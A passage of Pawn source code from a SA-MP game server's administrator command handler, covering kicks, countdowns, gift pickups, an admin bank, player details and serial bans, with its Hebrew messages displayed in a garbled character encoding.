			SetPlayerVelocity(id,p[0],p[1],p[2]+0.2);
		}
		PlaySound(playerid,1190);
		PlaySound(id,1190);
		if(playerinfo[playerid][admin] < 17) AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/getbank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getbank [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		format(string,sizeof(string)," фхр: %d$ %s юёЇ° фыёє ссЁў ∙щ∙ ь",playerinfo[id][bank],GetName(id));
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/giftstart") && IsPlayerMAdmin(playerid))
	{
	    if(playerinfo[playerid][admin] < 15 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
	    if(prizesys == true) return SendClientMessage(playerid,red," .щ∙ ыс° фЇ·Єф сюЇф");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /giftstart [gift type] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,white," (/giftlist :°∙щю· ёхтщ фю·Ёх·)");
		}
		new n = strval(cmd);
		if(n < 1 || n > 9) return SendClientMessage(playerid,red," .Єь юёЇ° ьфщх· сщя 1 ь 9");
		prizesystype = n;
		new tele = GetPlayerTeleportArea(playerid);
	    new Float:X,Float:Y,Float:Z;
	    new string[M_S_D];
	    new prizestring[M_S];
	    GetPlayerPos(playerid,X,Y,Z);
	    prizesypickup = CreatePickup(19056,3 ,X+4 ,Y ,Z);
	    prizesys = true;
	    if(prizesystype == 1) prizestring = " :щЎ° ЇщўрЇ фЇ·Єф, юф°х ьўч· рх·ф х·хыьх ьцых· с30,000$, ффЇ·Єф ЁюЎр· с∙щтх°";
	    if(prizesystype == 2) prizestring = " :щЎр ЇщўрЇ фЇ·Єф, юф°х ьўч· рх·ф хьцых· с15 ыух°щ сцхўф, ффЇ·Єф ЁюЎр· с∙щтх°";
	    if(prizesystype == 3) prizestring = " :щЎ° ЇщўрЇ фЇ·Єф, юф°х ьўч· рх·ф х·хыьх ьцых· с°ыс ющхчу юёхт: юёхўхя, ффЇ·Єф ЁюЎр· с∙щтх°";
        if(prizesystype == 4) prizestring = " :щЎ° ЇщўрЇ фЇ·Єф, юф°х ьўч· рх·ф х·хыьх ьцых· с°ыс ющхчу юёхт: ыщёр тьтьщэ, ффЇ·Єф ЁюЎр· с∙щтх°";
        if(prizesystype == 5) prizestring = " :щЎ° ЇщўрЇ фЇ·Єф, юф°х ьўч· рх·ф х·хыьх ьцых· с°ыс ющхчу юёхт: Єть· ёхЇ°, ффЇ·Єф ЁюЎр· с∙щтх°";
        if(prizesystype == 6) prizestring = " :щЎ° ЇщўрЇ фЇ·Єф, юф°х ьўч· рх·ф х·хыьх ьцых· счу° сшщэёЇщў ь∙схЄ, ффЇ·Єф ЁюЎр· с∙щтх°";
        if(prizesystype == 7) prizestring = " :щЎ° ЇщўрЇ фЇ·Єф, юф°х ьўч· рх·ф х·хыьх ьцых· с·рт сЇх°хэ ь∙схЄ, ффЇ·Єф ЁюЎр· с∙щтх°";
		if(prizesystype == 8) prizestring = " :ффЇ·Єф ЁюЎр· с∙щтх° ,Sultan :щЎ° ЇщўрЇ фЇ·Єф, юф°х ьўч· рх·ф х·хыьх ьцых· с°ыс °тщь юёхт";
		if(prizesystype == 9) prizestring = " :щЎ° ЇщўрЇ фЇ·Єф, юф°х ьўч· рх·ф х·хыьх ьцых· с∙щЁхщ ·рт рщ∙щ, ффЇ·Єф ЁюЎр· с∙щтх°";
		format(string,sizeof(string)," Х !" @c(yellow) "%s" @c(orange)" %s %s",Teleports[tele][Tcmd],prizestring,GetName(playerid));
		SendClientMessageToAll(orange,string);
		return 1;
	}
	if(equal(cmd,"/giftend") && IsPlayerMAdmin(playerid))
	{
	    if(playerinfo[playerid][admin] < 15 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
	    if(prizesys == false) return SendClientMessage(playerid,red," .рщя фЇ·Єф сюЇф");
	    new string[M_S];
   		DestroyPickup(prizesypickup);
		prizesys = false;
		format(string,sizeof(string)," Х !сщшь р· ЇщўрЇ ффЇ·Єф %s",GetName(playerid));
		SendClientMessageToAll(orange,string);
		return 1;
	}
	if(equal(cmd,"/giftlist") && IsPlayerMAdmin(playerid))
	{
	    if(playerinfo[playerid][admin] < 15 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
		SendClientMessage(playerid,green," 1) 30,000$");
		SendClientMessage(playerid,red," 2) 15 ыух°щ сцхўф");
		SendClientMessage(playerid,green," 3) °ыс ющхчу: юёхўхя");
		SendClientMessage(playerid,red," 4) °ыс ющхчу: ыщёр тьтьщэ");
		SendClientMessage(playerid,green," 5) °ыс ющхчу: Єть· ёхЇ°");
		SendClientMessage(playerid,red," 6) чу° сшщэёЇщў ь∙схЄ");
		SendClientMessage(playerid,green," 7) ·рт сЇх°хэ ь∙схЄ");
		SendClientMessage(playerid,red," 8) °ыс ёхьшя");
		SendClientMessage(playerid,red," 9) ∙щЁхщ ·рт рщ∙щ");
		return 1;
	}
	if(equal(cmd, "/start") && IsPlayerMAdmin(playerid))
	{
	    if(!wantedGameCMD[0]) return SendClientMessage(playerid, red, " .рщя сў∙ф ьЇЄщьх· ы°тЄ");
		command(playerid,wantedGameCMD);
		return 1;
	}
	if(equal(cmd,"/kick") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new id, reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /kick [id/name] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		SetKick(id,playerid,reason);
		return 1;
	}
	if((equal(cmd,"/cd") || equal(cmd,"/countdown")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		new secs, f;
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		if(cd[0]) return SendClientMessage(playerid,red," .ыс° щ∙ ёЇщ°ф ыЄ·");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /countdown(cd) [seconds] [freeze? 0/1/2] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,white," 0 = ььр Ї°щц X 1 = Ї°щц °ў ь∙чўЁщэ ў°хсщэ X 2 = Ї°щц ьыь ф∙°·");
		}
		secs = strval(cmd);
		if(secs < 1 || secs > 600) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ ёЇщ°ф ∙ь щх·° ю600 ∙Ёщх· рх Їчх· ю∙Ёщф");
		cmd = strtok(cmdtext,idx);
		f = !strlen(cmd) || !IsNumeric(cmd)? 0:strval(cmd);
		if(f < 0 || f > 2) return SendClientMessage(playerid,red," .рЇ∙°х· фўЇрф сёЇщ°ф ∙тхщф");
		if(f > 0) for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && ((IsPlayerStreamedIn(i,playerid) && f == 1) || f == 2))
		{
			SetFreeze(i,1);
			playerinfo[i][cdfrozen] = 1;
		}
		cdtext[0] = "~b~$NUM$", cdtext[1] = "~r~go~h~!", cd[0] = 1, cd[1] = secs;
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if((equal(cmd,"/scd") || equal(cmd,"/scountdown")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		if(!cd[0]) return SendClientMessage(playerid,red," .рщя ёЇщ°ф ыЄ·");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][cdfrozen]) SetFreeze(i,0);
		cd = {0,0,-1}, cdtext[0] = "~b~$NUM$", cdtext[1] = "~r~go~h~!";
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if((equal(cmd,"/xcd") || equal(cmd,"/xcountdown")) && IsPlayerMAdmin(playerid))
	{
		new secs, f;
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		if(cd[0]) return SendClientMessage(playerid,red," .ыс° щ∙ ёЇщ°ф ыЄ·");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /xcountdown(xcd) [seconds] [freeze? 0/1/3] [number text] [go text] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," [freeze] 0 = ььр Ї°щц X 1 = Ї°щц °ў ь∙чўЁщэ ў°хсщэ X 2 = Ї°щц ьыь ф∙°·");
			SendClientMessage(playerid,white," [text] _ ьфыЁё· °ххч ф∙·ю∙ с");
			return SendClientMessage(playerid,white," /xcd 5 0 ~g~$NUM$ ~r~go_~b~! :ухтюф ь∙щюх∙");
		}
		secs = strval(cmd);
		if(secs < 1 || secs > 600) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ ёЇщ°ф ∙ь щх·° ю600 ∙Ёщх· рх Їчх· ю∙Ёщф");
		cmd = strtok(cmdtext,idx);
		f = !strlen(cmd) || !IsNumeric(cmd)? 0:strval(cmd);
		if(f < 0 || f > 2) return SendClientMessage(playerid,red," .рЇ∙°х· фўЇрф сёЇщ°ф ∙тхщф");
		if(f > 0) for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && ((IsPlayerStreamedIn(i,playerid) && f == 1) || f == 2))
		{
			SetFreeze(i,1);
			playerinfo[i][cdfrozen] = 1;
		}
		cmd = strtok(cmdtext,idx);
		if(strlen(cmd) > 25) return SendClientMessage(playerid,red," .рх°ъ шўёш юёЇ° тухь юущ");
		if(strlen(cmd) > 0)
		{
			format(cdtext[0],sizeof(cdtext[]),cmd);
			cmd = strtok(cmdtext,idx);
			if(strlen(cmd) > 25) return SendClientMessage(playerid,red," .тухь юущ GO рх°ъ шўёш");
			if(strlen(cmd) > 0) format(cdtext[1],sizeof(cdtext[]),cmd);
		}
		cd[0] = 1, cd[1] = secs;
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if((equal(cmd,"/rm") || equal(cmd,"/resetmoney")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /resetmoney(rm) [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
    	new logt[M_S];
		format(logt, M_S, "lost %d (admin rm)", GetMoney(id));
		Log("Money", id, logt);
		ResetMoney(id);
		format(string,sizeof(string)," *** %s's money has been reseted by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || IsPlayerMAdmin(i) || i == playerid)) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/jetpack") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK) return SendClientMessage(playerid,red," .р·ф ыс° ю∙·ю∙ с·щў ёщьхя");
		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхї ь°ыс");
		if(IsPlayerInCircle(playerid,-67.1489,-3230.8315,50.0)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сющўхюъ фЁхычщ");
		if(!playerinfo[playerid][pinv] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя ься сыущ ьф∙·ю∙ сЇўхуф цх");
		GiveJetpack(playerid);
		return 1;
	}
	if(equal(cmd,"/details") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /details [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		format(string,sizeof(string)," ~~~ :%s - Ї°шщэ ~~~",GetName(id));
		SendClientMessage(playerid,lightblue,string);
		format(string,sizeof(string)," Ping: " @c(white) "%d",GetPlayerPing(id));
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," IP: " @c(white) "%s",GetIP(id));
		if(playerinfo[id][admin] > playerinfo[playerid][admin]) format(string,sizeof(string)," IP: " @c(white) "***.***.***.***");
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," Game money: " @c(white) "$%d" @c(yellow) ", Mode money: " @c(white) "$%d",GetPlayerMoney(id),GetMoney(id));
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," Bank Money: " @c(white) "%d",playerinfo[id][bank]);
		SendClientMessage(playerid,yellow,string);
		new pCode = CallRemoteFunction("GetPlayerPrize","i",id);
		if(!pCode) string = "рщя";
		else if(pCode >= 1 && pCode <= 12)
		{
			string = "";
			for(new i = 1; i < sizeof(Codes) && !strlen(string); i++) if(Codes[i][cdSID] == pCode) format(string,sizeof(string),Codes[i][cdName]);
		}
		else string = "щ∙, ўху ьр щухЄ";
		format(string,sizeof(string)," Code: " @c(white) "%s",string);
		SendClientMessage(playerid,yellow,string);
		if(playerinfo[playerid][admin] >= 20)
		{
			format(string,sizeof(string)," UID: " @c(white) "%s",GetSerial(id));
			SendClientMessage(playerid,yellow,string);
		}
		return 1;
	}
	if(equal(cmd,"/resetc") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /resetc [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!playerinfo[id][acwarns]) return SendClientMessage(playerid,red," .ью∙·ю∙ цф рщя рцф°х·");
		playerinfo[id][acwarns] = 0, playerinfo[id][tricking][0] = 0;
		format(string,sizeof(string)," .%s рщЇё· р· рцф°х· фЎ'щшщэ ∙ь",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string),"%s Ёхўх рцф°х· Ў'щшщэ Єь щущ",GetName(playerid));
		AdminInfo(id,string);
		return 1;
	}
	if(equal(cmd,"/nicknames") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new id, string[M_S], cur = 0, f[64], k[16];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /nicknames [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		format(string,sizeof(string)," ~~~ :%s - °∙щю· ыщЁхщщэ рч°хЁщэ ~~~",GetName(id));
		SendClientMessage(playerid,lightblue,string);
		format(f,sizeof(f),folder_infonl "%s.txt",GetName(playerid));
		if(!fexist(f)) return SendClientMessage(playerid,red," .фю∙·ю∙ ьр ∙щЁф ыщЁхщщэ ьрч°хЁф");
		else for(new i = 1; i <= SAVING_NICKNAMES; i++)
		{
			format(k,sizeof(k),"Nick%02d",i);
			format(k,sizeof(k),fgetstring(f,k));
			format(string,sizeof(string),!cur ? (" %s%d. %s") : ("%s | %d. %s"),string,i,k);
			cur++;
			if(cur >= 3 || equal(k,"X"))
			{
				SendClientMessage(playerid,yellow,string);
				string = "", cur = 0;
				if(equal(k,"X")) break;
			}
			else if(i == SAVING_NICKNAMES) SendClientMessage(playerid,yellow,string);
		}
		return 1;
	}
	if(equal(cmd,"/pingtest") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new id, string[M_S], secs;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pingtest [id/name] [seconds] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		cmd = strtok(cmdtext,idx), secs = !strlen(cmd) || !IsNumeric(cmd) ? 60 : strval(cmd);
		if(secs < 10 || secs > MAX_PINGTEST) return SendClientMessage(playerid,red," .юёЇ° цюя Ёюхъ рх тсхф юущ");
		if(playerinfo[id][pingtest][0]) return SendClientMessage(playerid,red," .ющ∙фх ыс° юсЎЄ сущў· ЇщЁт Єь фю∙·ю∙ фцф");
		playerinfo[id][pingtest][0] = 1, playerinfo[id][pingtest][1] = 0, playerinfo[id][pingtest][2] = secs;
		playerinfo[playerid][apingtest][0] = 1, playerinfo[playerid][apingtest][1] = id;
		format(string,sizeof(string)," ...сущў· фЇщЁт фчьф, ·ўсь ·∙хсф сЄху %d ∙Ёщх·",secs);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/abank") && IsPlayerMAdmin(playerid))
	{
	    if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		if(GetPlayerCheckpoint(playerid) != cp_abank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў рующЁщэ сыущ ьсЎЄ Їўхуф цх");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /abank [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /abank balance :сущў· юрця фыёє ссЁў фрующЁщэ");
			SendClientMessage(playerid,white," /abank deposit :фхёЇ· ыёє ьсЁў фрующЁщэ");
			SendClientMessage(playerid,white," /abank depositall :фхёЇ· ыь фыёє ∙ьъ ьсЁў фрующЁщэ");
			SendClientMessage(playerid,white," /abank withdraw :фхЎр· ыёє юсЁў фрующЁщэ");
			return 1;
		}
		new string[M_S];
		if(equal(cmd,"balance"))
		{
			format(string,sizeof(string)," .ссЁў фрующЁщэ щ∙ ы°тЄ $%d",abankMoney);
			SendClientMessage(playerid,yellow,string);
		}
		else if(equal(cmd,"deposit"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /abank deposit [amount] :Ўх°· ф∙щюх∙");
			new amount = strval(cmd);
			if(amount < 1 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє");
			GiveMoney(playerid,0-amount);
			abankMoney += amount;
			fsetint(file_srvdetails,"AdminBank",abankMoney);
			format(string,sizeof(string)," .фЇўу· ссЁў фрующЁщэ $%d, ыЄ· щ∙ сх $%d",amount,abankMoney);
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"depositall"))
		{
			new pMoney = GetMoney(playerid);
			if(pMoney <= 0) return SendClientMessage(playerid,red," .рщя ьъ ыёє");
			GiveMoney(playerid,0-pMoney);
			abankMoney += pMoney;
			format(string,sizeof(string)," .фЇўу· р· ыь ыёЇъ ссЁў фрующЁщэ, ыЄ· щ∙ сх $%d",abankMoney);
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"withdraw"))
		{
			if(DaysBetweenDates(fgetstring(fuser(playerid),"LastABWithdraw"),GetDateAsString()) > 6) fsetint(fuser(playerid),"ABWithdrawLimit",0);
			if(fgetint(fuser(playerid),"ABWithdrawLimit") >= 3) return SendClientMessage(playerid,red," .Ёщ·я ьф∙·ю∙ сЇўхуф цх °ў 3 ЇЄющэ с∙схЄ");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /abank withdraw [amount] :Ўх°· ф∙щюх∙");
			new amount = strval(cmd);
			if(amount < 1 || amount > 2000) return SendClientMessage(playerid,red," .фыюх· Ў°щыф ьфщх· сщя 1$ ь 2000$");
			if(amount < 1 || amount > abankMoney) return SendClientMessage(playerid,red," .рщя юёЇщў ыёє ссЁў фрующЁщэ");
			GiveMoney(playerid,amount);
			abankMoney -= amount;
			fsetint(file_srvdetails,"AdminBank",abankMoney);
			fsetstring(fuser(playerid),"LastABWithdraw",GetDateAsString());
			fsetint(fuser(playerid),"ABWithdrawLimit",fgetint(fuser(playerid),"ABWithdrawLimit")+1);
			format(string,sizeof(string)," .фхЎр· $%d юсЁў фрующЁщэ",amount);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string),"Admin Bank: withdraw %d",amount);
			Log("Attention",playerid,string);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· сЁў рующЁщэ ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/int") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 6");
		if(!fexist(file_int)) return SendClientMessage(playerid,red," .ўхсї фрщЁш°щх°щэ ьр ЁюЎр, рщя рЇ∙°х· ьфЇЄщь р· фЇўхуф");
		new temp[256], id, File:fhandle, index2 = 0, temp2[256], tempid, Float:p[4], int;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /int [1-146] :Ўх°· ф∙щюх∙");
		id = strval(cmd);
		if(id < 1 || id > 146) return SendClientMessage(playerid,red," .юёЇ° рщЁш°щх° ∙тхщ");
		fhandle = fopen(file_int,io_read);
		while(fread(fhandle,temp,sizeof(temp),false))
		{
			index2 = 0, temp2 = strtok(temp,index2), tempid = strval(temp2);
			if(tempid == id)
			{
				int = strval(strtok(temp,index2)),
				p[0] = floatstr(strtok(temp,index2)),
				p[1] = floatstr(strtok(temp,index2)),
				p[2] = floatstr(strtok(temp,index2)),
				p[3] = floatstr(strtok(temp,index2));
				if(IsPlayerInAnyVehicle(playerid))
				{
					LinkVehicleToInterior(GetPlayerVehicleID(playerid),int);
					SetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2],playerid);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),p[3]);
				}
				else
				{
					SetPlayerPos(playerid,p[0],p[1],p[2]);
					SetPlayerFacingAngle(playerid,p[3]);
				}
				SetPlayerInterior(playerid,int);
				break;
			}
			else continue;
		}
		fclose(fhandle);
		format(temp,sizeof(temp)," .∙хт°· ьрщЁш°щх° юёЇ° %03d",id);
		SendClientMessage(playerid,green,temp);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/lastcmds") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		SendClientMessage(playerid,lightblue," ~~~ :Їўхух· ∙чўЁщэ рч°хЁх· ∙схЎЄх ~~~");
		new string[M_S];
		for(new i = 0; i < sizeof(lastCMDUsers); i++)
		{
			if(lastCMDUsers[i][lcuID] == INVALID_PLAYER_ID) format(string,sizeof(string)," %d) рщя",i+1);
			else if(lastCMDUsers[i][lcuID] == -1) format(string,sizeof(string)," %d) [щЎр юф∙°·] %s - %s",i+1,lastCMDUsers[i][lcuPlayer],lastCMDUsers[i][lcuCMD]);
			else format(string,sizeof(string)," %d) [ID: %03d] %s - %s",i+1,lastCMDUsers[i][lcuID],lastCMDUsers[i][lcuPlayer],lastCMDUsers[i][lcuCMD]);
			SendClientMessage(playerid,i % 2 == 0 ? grey : white,string);
		}
		return 1;
	}
	if(equal(cmd,"/noname") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new cmd2[64], id, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /noname [id/name] [off/on] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"off")) playerinfo[id][noname] = 0;
		else if(equal(cmd2,"on")) playerinfo[id][noname] = 1;
		else return SendClientMessage(playerid,red," .∙тщрф сЇ°юш° ф∙ьщ∙щ");
		format(string,sizeof(string),playerinfo[id][noname] ? (" .тщ∙ф ьфтущ° ∙э Ї°шщ %s фх°у· ь") : (" .тщ∙ф ьфтущ° ∙э Ї°шщ %s Ё·· ь"),GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green,playerinfo[id][noname] ? (" .фрующя чёэ ьъ р· фрЇ∙°х· ьфтущ° ∙э Ї°шщ") : (" .фрующя фёщ° р· фчёщюф ∙ьъ ьфтущ° ∙э Ї°шщ"));
		format(playerinfo[id][rname],16,"None");
		if(playerinfo[id][logged])
		{
			fsetint(fuser(id),"NoName",playerinfo[id][noname]);
			fsetstring(fuser(id),"ProfileRealName","None");
		}
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/pbanuid") && IsPlayerMAdmin(playerid))
	{
	    if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .19 Єьщъ ьфщх· ьЇчх· с°ю· рующя");
	    new id = INVALID_PLAYER_ID, string[M_S];
	    cmd = strtok(cmdtext,idx);
	    if(!strlen(cmd)) return SendClientMessage(playerid,white," /pbanuid [id/name] :Ўх°· ф∙щюх∙");
	    id = ReturnUser(cmd,playerid);
	    if(!IsPlayerConnected(id) || IsPlayerNPC(id)) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string),"%s%s.ban",folder_banuid,GetSerial(id));
		if(fexist(string)) return SendClientMessage(playerid,red," .фёщ°рь ∙ь ∙чўя цф ыс° ЁюЎр ссря");
		fcreate(string);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && equal(GetSerial(i),GetSerial(id)) && CommandAllowed(playerid,i,cmdtext))
		{
		    format(string,sizeof(string)," *** %s has been unique id banned by %s.",GetName(i),GetName(playerid));
			SendClientMessageToAll(red,string);
			Kick(i);
		}
	    return 1;
	}
	if(equal(cmd,"/banuid") && IsPlayerMAdmin(playerid))
	{
	    if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .19 Єьщъ ьфщх· ьЇчх· с°ю· рующя");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /banuid [serial] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string),"%s%s.ban",folder_banuid,cmd);
